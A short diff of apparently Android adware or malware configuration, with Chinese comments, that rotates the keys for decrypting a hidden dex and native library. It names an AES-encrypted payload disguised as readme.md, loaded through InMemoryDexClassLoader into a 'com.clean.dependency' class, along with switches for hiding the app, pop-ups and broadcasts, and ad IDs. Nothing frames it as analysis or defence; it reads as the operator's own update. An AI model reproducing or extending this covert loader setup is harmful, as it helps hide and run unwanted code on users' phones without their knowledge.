@@ -8,11 +8,12 @@ A:
 "m_d_v": "",
 "n_t_v": "30-30-8-16-80-500-800-10-1500",
 "vmfk_a_i": "981772962-981772963",
-"jia_kf": "Jvklmsd6GNJcdenj",
-"wt_kk": "WnVJ8ekmcEJN9jcq",
-"mkri_ce": "beis-cgfun-brfell-pwsss",
+"jia_kf": "DKs2s4G3hffj3ke3",
+"wt_kk": "MKvf7G8Fjke4Fkm5",
+"mkri_ce": "peektalk-tssf-tellnc-hitree",
 "domo_so": "readme.md-AES-dalvik.system.InMemoryDexClassLoader-com.clean.dependency.Core-a"
 }
+
 B: {
 "date_show": "60-60",
 "lit_po": "1000",
@@ -49,11 +50,11 @@ B: {
 // 广告id1 -广告id2
 "vmfk_a_i": "981772962-981772963",
 // 解密dex的key
-"jia_kf": "Jvklmsd6GNJcdenj",
+"jia_kf": "DKs2s4G3hffj3ke3",
 // 解密so的key
-"wt_kk": "WnVJ8ekmcEJN9jcq",
+"wt_kk": "MKvf7G8Fjke4Fkm5",
 // 隐藏/外弹/广播/文件开关 和So的信息依依对应
-"mkri_ce": "beis-cgfun-brfell-pwsss",
+"mkri_ce": "peektalk-tssf-tellnc-hitree",
 //文件名，加密方式，InMemoryDexClassLoader路径，调用dex方法路径，调用dex方法名，用-号隔开
 "domo_so": "readme.md-AES-dalvik.system.InMemoryDexClassLoader-com.clean.dependency.Core-a"
 }
